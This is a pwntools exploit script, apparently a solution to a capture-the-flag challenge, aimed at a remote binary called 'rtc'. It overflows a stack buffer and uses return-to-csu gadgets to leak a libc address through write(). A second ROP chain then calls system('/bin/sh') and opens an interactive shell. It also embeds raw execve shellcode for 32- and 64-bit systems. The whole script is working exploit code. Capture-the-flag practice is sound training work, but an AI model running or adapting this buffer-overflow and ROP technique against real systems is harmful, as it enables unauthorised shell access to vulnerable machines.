from pwn import *
from Crypto.Util.number import bytes_to_long


r = remote("ctf.j0n9hyun.xyz", 3025)
# r = process("./rtc")



libc = ELF("./libc.so.6")


shellcode32 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
shellcode64 = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"


'''
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
'''



write_plt = 0x4004b0
write_got = 0x601018
pop_rdi_ret = 0x4006c3
main = 0x4005f6

csu_gadget1 = 0x4006a0
csu_gadget2 = 0x4006ba



# libc leak and go to main

payload  = b""
payload += b"a" * 0x40
payload += b"b" * 0x08
payload += p64(csu_gadget2)

# ret addr = R12 + RBX*0x8
# csu
payload += p64(0) # rbx
payload += p64(1) # rbp => cmp rbp, 1
payload += p64(write_got) # r12 => addr
payload += p64(16) # r13 -> rdx 3번째 인자
payload += p64(write_got) # r14 -> rsi 2번째 인자
payload += p64(1) # r15 -> rdi 1번째 인자
payload += p64(csu_gadget1)

payload += b"c" * 8 # dummy
#dummy
payload += p64(0) # rbx
payload += p64(1) # rbp => cmp rbp, 1
payload += p64(write_got) # r12 => addr
payload += p64(16) # r13 -> rdx 3번째 인자
payload += p64(write_got) # r14 -> rsi 2번째 인자
payload += p64(1) # r15 -> rdi 1번째 인자
#dummy
payload += p64(main)











pause()
r.sendline(payload)
pause()

sleep(1)

r.recvuntil("\n")

libc_base = u64(r.recv(8).ljust(8, b"\x00"))
print(libc_base)


libc_system = libc_base + (libc.symbols['system'] - libc.symbols['write'])
libc_binsh = libc_base + (next(libc.search(b"/bin/sh")) - libc.symbols['write'])



# call system("/bin/sh")
payload  = b""
payload += b"a" * 0x40
payload += b"b" * 0x08
payload += p64(pop_rdi_ret)
payload += p64(libc_binsh)
payload += p64(libc_system)

r.sendline(payload)
pause()

r.interactive()
# 






